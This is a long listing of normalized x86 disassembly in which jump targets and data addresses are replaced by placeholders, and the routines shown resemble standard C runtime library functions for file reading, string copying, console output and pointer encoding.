push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_411d67
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_411e8c
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1c ] eax
call sub_40710b
and [ ebp - 0x14 ] 0x0
cmp [ rw-data ] 0x0
mov [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x18 ]
mov esi [ DecodePointer@IAT ]
cmp eax ecx
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
cmp [ rw-data ] ecx
je r-xdata
xor eax eax
mov edi [ GetProcAddress@IAT ]
push r--data
push ebx
call edi
test eax eax
je r-xdata
push [ rw-data ]
call esi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
push eax
call esi
push [ rw-data ]
mov edi eax
call esi
mov ebx eax
test edi edi
je r-xdata
mov esi [ EncodePointer@IAT ]
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x14 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push r--data
push ebx
call edi
push eax
call esi
mov [ rw-data ] eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_407abb
leave
retn
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
call edi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call ebx
test eax eax
je r-xdata
push [ ebp - 0x14 ]
call eax
mov [ ebp - 0x14 ] eax
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_411ff8
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_40c61a
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
mov edx esi
xor eax eax
mov [ esi ] ax
jmp r-xdata
test edi edi
je r-xdata
add edx 0x2
dec edi
jne r-xdata
sub edx ecx
cmp [ edx ] 0x0
je r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_40c61a
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx eax [ ecx ]
mov [ edx + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
call sub_40c5c8
mov eax esi
sub_41206d
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
test ebx ebx
jne r-xdata
test edx edx
je r-xdata
test edx edx
jne r-xdata
call sub_40c61a
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test ebx ebx
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov eax edx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov esi ecx
sub esi edx
mov esi edx
sub esi ecx
test ebx ebx
jne r-xdata
dec edi
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor ecx ecx
mov [ eax ] cx
dec ebx
jne r-xdata
xor eax eax
cmp ebx 0xffffffff
jne r-xdata
movzx eax [ ecx ]
mov [ esi + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx ecx [ esi + eax ]
mov [ eax ] cx
add eax 0x2
test cx cx
je r-xdata
mov [ edx ] ax
call sub_40c61a
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ edx + ecx * 2 - 0x2 ] ax
pop eax
jmp r-xdata
call sub_40c5c8
mov eax esi
jmp r-xdata
sub_41213a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_412155
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_40c61a
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov edx esi
sub edx eax
mov [ esi ] ax
jmp r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_40c61a
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx ecx [ eax ]
mov [ edx + eax ] cx
add eax 0x2
test cx cx
je r-xdata
call sub_40c5c8
mov eax esi
sub_4121b8
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
js r-xdata
call sub_40c61a
mov [ eax ] 0x16
call sub_40c5c8
or eax 0xffffffff
pop ebp
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop ebp
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop ebp
retn
sub_4121f7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40974b
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_412262
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push 0xfffffffe
pop eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] edx
cmp esi eax
jne r-xdata
push ebx
xor ebx ebx
cmp esi ebx
jl r-xdata
call sub_40c62d
and [ eax ] 0x0
call sub_40c61a
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_40c62d
mov [ eax ] ebx
call sub_40c61a
mov [ eax ] 0x9
call sub_40c5c8
or eax 0xffffffff
jmp r-xdata
cmp esi [ rw-data ]
jb r-xdata
pop esi
leave
retn
pop ebx
mov eax esi
sar eax 0x5
push edi
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
shl esi 0x6
mov cl [ eax + esi + 0x4 ]
test cl 0x1
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_40c62d
mov [ eax ] ebx
call sub_40c61a
mov [ eax ] 0x9
jmp r-xdata
call sub_40c62d
mov [ eax ] ebx
call sub_40c61a
mov [ eax ] 0x16
mov [ ebp - 0xc ] ebx
cmp edx ebx
je r-xdata
call sub_40c5c8
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
test cl 0x2
jne r-xdata
pop edi
cmp [ ebp + 0xc ] ebx
je r-xdata
mov al [ eax + esi + 0x24 ]
add al al
sar al 0x1
mov [ ebp - 0x2 ] al
movsx eax al
dec eax
push 0x4
pop ecx
je r-xdata
mov eax edx
not eax
test al 0x1
jne r-xdata
dec eax
jne r-xdata
mov eax edx
shr eax 0x1
mov [ ebp + 0x10 ] ecx
cmp eax ecx
jb r-xdata
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov eax edx
not eax
test al 0x1
je r-xdata
push [ ebp + 0x10 ]
call sub_409f19
mov ebx eax
pop ecx
mov [ ebp - 0x10 ] ebx
test ebx ebx
jne r-xdata
mov [ ebp + 0x10 ] eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
mov eax ebx
je r-xdata
and edx 0xfffffffe
mov [ ebp + 0x10 ] edx
push 0x1
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_40e37f
mov ecx [ edi ]
mov [ esi + ecx + 0x28 ] eax
add esp 0x10
mov [ esi + ecx + 0x2c ] edx
call sub_40c61a
mov [ eax ] 0xc
call sub_40c62d
mov [ eax ] 0x8
push 0x0
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp + 0x10 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ ecx + 0x5 ]
cmp cl 0xa
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x18 ]
test ecx ecx
js r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_40c61a
mov [ eax ] 0x9
call sub_40c62d
mov [ eax ] esi
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
ja r-xdata
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x0
mov [ ebx ] cl
mov ecx [ edi ]
lea eax [ ebx + 0x1 ]
mov [ ebp - 0xc ] 0x1
mov [ esi + ecx + 0x5 ] 0xa
je r-xdata
push eax
call sub_40c640
pop ecx
and [ ebp - 0x14 ] 0x0
jmp r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov eax [ edi ]
add [ ebp - 0xc ] ecx
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x80
je r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x25 ]
cmp cl 0xa
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xfffffffe
jne r-xdata
push eax
call sub_408a41
pop ecx
mov eax [ ebp - 0x10 ]
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp - 0x2 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
je r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0xc ] 0x2
mov [ esi + ecx + 0x25 ] 0xa
jne r-xdata
and [ eax ] 0xfb
cmp [ ebx ] 0xa
jne r-xdata
and [ eax ] 0xfb
cmp [ ebx ] 0xa
jne r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x26 ]
cmp cl 0xa
je r-xdata
sub ebx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
cmp ecx 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
mov eax ebx
sub eax [ ebp - 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0xc ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ecx ]
cmp al 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx [ edi ]
lea esi [ esi + ecx + 0x4 ]
test [ esi ] 0x40
jne r-xdata
cmp ecx 0xd
je r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0xc ] eax
cmp ebx eax
jae r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0xc ] eax
cmp ebx eax
jae r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x3
mov [ esi + ecx + 0x26 ] 0xa
mov ax [ eax ]
mov [ ebx ] ax
add ebx 0x2
or [ esi ] 0x2
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0xfffffffe
cmp eax ecx
jae r-xdata
mov [ ebx ] cx
add ebx 0x2
add eax 0x2
mov [ ebp + 0x10 ] eax
jmp r-xdata
dec ebx
mov cl [ ebx ]
test cl cl
js r-xdata
mov al [ ecx ]
mov [ ebx ] al
inc ebx
or [ eax ] 0x2
jmp r-xdata
mov eax [ ebp - 0xc ]
dec eax
cmp ecx eax
jae r-xdata
mov [ ebx ] al
inc ebx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
xor eax eax
inc eax
movzx ecx cl
jmp r-xdata
inc ebx
jmp r-xdata
inc [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add eax 0x4
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ecx + rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
sub ebx [ ebp - 0x10 ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
push ebx
push [ ebp - 0x10 ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0xc ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
add ecx 0x2
mov [ ebp + 0x10 ] ecx
jmp r-xdata
push 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
pop eax
mov [ ebx ] ax
cmp eax 0x4
jg r-xdata
mov dl [ ebx ]
movzx ecx dl
movsx ecx [ ecx + rw-data ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ edi ]
xor ecx ecx
cmp eax ebx
setne cl
add eax eax
mov [ ebp - 0xc ] eax
mov [ esi + edx + 0x30 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebx ] 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc ebx
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp ebx [ ebp - 0x10 ]
jb r-xdata
inc ecx
cmp ecx eax
jne r-xdata
call sub_40c61a
mov [ eax ] 0x2a
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_40e37f
add esp 0x10
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
push 0xa
jmp r-xdata
push 0xd
pop eax
mov [ ebx ] ax
mov eax [ edi ]
mov cl [ ebp - 0x8 ]
mov [ esi + eax + 0x5 ] cl
mov eax [ edi ]
mov cl [ ebp - 0x7 ]
mov [ esi + eax + 0x25 ] cl
mov eax [ edi ]
mov [ esi + eax + 0x26 ] 0xa
jmp r-xdata
dec ebx
movzx ecx [ ebx ]
inc eax
mov ecx [ edi ]
test [ ecx + esi + 0x4 ] 0x48
je r-xdata
add ebx eax
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_40e37f
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
mov cl [ ebp - 0x1 ]
mov [ esi + eax + 0x5 ] cl
jmp r-xdata
add ebx 0x2
neg eax
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_40e37f
add esp 0x10
inc ebx
mov [ ecx + esi + 0x5 ] dl
cmp eax 0x2
jl r-xdata
cmp eax 0x3
jne r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x25 ] dl
inc ebx
sub ebx eax
jmp r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x26 ] dl
inc ebx
sub_412819
push 0x10
push r--data
call sub_40be80
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_40c62d
and [ eax ] 0x0
call sub_40c61a
mov [ eax ] 0x9
call sub_40c62d
and [ eax ] 0x0
call sub_40c61a
mov [ eax ] 0x9
cmp ebx [ rw-data ]
jb r-xdata
call sub_40bec5
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
mov eax 0x7fffffff
cmp eax [ ebp + 0x10 ]
sbb eax eax
inc eax
jne r-xdata
push ebx
call sub_412c4a
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_40c62d
and [ eax ] 0x0
call sub_40c61a
mov [ eax ] 0x16
jmp r-xdata
call sub_40c61a
mov [ eax ] 0x9
call sub_40c62d
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_412262
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
call sub_40c5c8
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_412907
mov eax [ ebp - 0x1c ]
sub_41290f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_40c61a
mov [ eax ] 0x9
call sub_40c61a
mov [ eax ] 0x9
call sub_40c5c8
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
xor eax eax
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
pop ebp
retn
sub_412965
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_413115
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
leave
retn
mov ax [ ebp + 0x8 ]
leave
retn
sub_4129a7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_40974b
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_412ad7
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx ecx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_40c61a
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_412ad7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40974b
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_412b30
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_412b5b
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
jl r-xdata
call sub_40c61a
mov [ eax ] 0x9
call sub_40c62d
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x1
je r-xdata
cmp [ eax + esi ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_412be1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_40c62d
and [ eax ] 0x0
call sub_40c61a
mov [ eax ] 0x9
call sub_40c62d
and [ eax ] 0x0
call sub_40c61a
mov [ eax ] 0x9
call sub_40c5c8
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
or eax 0xffffffff
pop ebp
retn
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
test [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov eax [ eax + ecx ]
pop ebp
retn
sub_412c4a
push 0xc
push r--data
call sub_40be80
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_40b2e6
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_40bec5
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_412ce0
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_412ce9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_412d10
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
movzx ecx [ edx ]
lea edi [ ecx - 0x41 ]
inc edx
cmp edi 0x19
ja r-xdata
add eax 0x20
test eax eax
je r-xdata
add ecx 0x20
pop edi
sub eax ecx
pop esi
pop ebp
retn
cmp eax ecx
je r-xdata
movzx eax [ esi ]
lea ecx [ eax - 0x41 ]
inc esi
cmp ecx 0x19
ja r-xdata
sub_412d49
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_40974b
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_40c61a
mov [ eax ] 0x16
call sub_40c5c8
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
call sub_40c61a
mov [ eax ] 0x16
call sub_40c5c8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub ebx esi
push edi
push esi
push ebx
call sub_412d10
pop ecx
pop ecx
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
sub edi eax
mov eax edi
pop edi
cmp edi eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
movzx eax [ ebx + esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_41314b
mov edi eax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_41314b
add esp 0x10
inc esi
test edi edi
je r-xdata
sub_412e09
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ rw-data ] eax
jne r-xdata
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_412d49
add esp 0xc
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_40c61a
mov [ eax ] 0x16
call sub_40c5c8
mov eax 0x7fffffff
pop ebp
retn
pop ebp
jmp sub_412d10
sub_412e66
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
push ebx
push esi
push edi
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_40974b
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
call sub_40c61a
mov [ eax ] 0x16
